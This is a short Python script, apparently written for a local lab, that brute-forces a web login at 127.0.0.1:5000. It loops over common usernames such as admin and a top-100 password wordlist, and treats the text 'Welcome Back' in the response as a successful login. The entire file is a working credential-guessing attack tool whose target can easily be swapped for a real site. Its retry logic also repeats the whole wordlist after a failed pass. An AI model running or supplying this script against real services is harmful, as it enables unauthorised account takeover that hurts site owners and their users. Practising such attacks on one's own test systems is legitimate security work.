import requests
import sys
import time

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Welcome Back"

# Maximum number of retry attempts
max_retries = 3

for username in usernames:
    for attempt in range(max_retries):
        try:
            with open(passwords, "r") as passwords_list:
                for password in passwords_list:
                    password = password.strip("\n").encode()
                    sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
                    r = requests.post(target, data={"username": username, "password": password})
                    
                    if needle.encode() in r.content:
                        sys.stdout.write("\n")
                        sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}' !".format(password.decode(), username))
                        sys.exit()
                    
                sys.stdout.flush()
                sys.stdout.write("\n")
                sys.stdout.write("\tNo password for '{}'!\n".format(username))
                sys.stdout.write("\n")
                
        except requests.exceptions.ConnectionError:
            # Connection error occurred, wait for a moment before retrying
            sys.stdout.write("\n")
            sys.stdout.write("\t[INFO] Connection refused. Retrying in 5 seconds...\n")
            time.sleep(5)
            continue

# If no valid password is found after all retries
sys.stdout.write("\n")
sys.stdout.write("\t[INFO] No valid password found after all retries.\n")
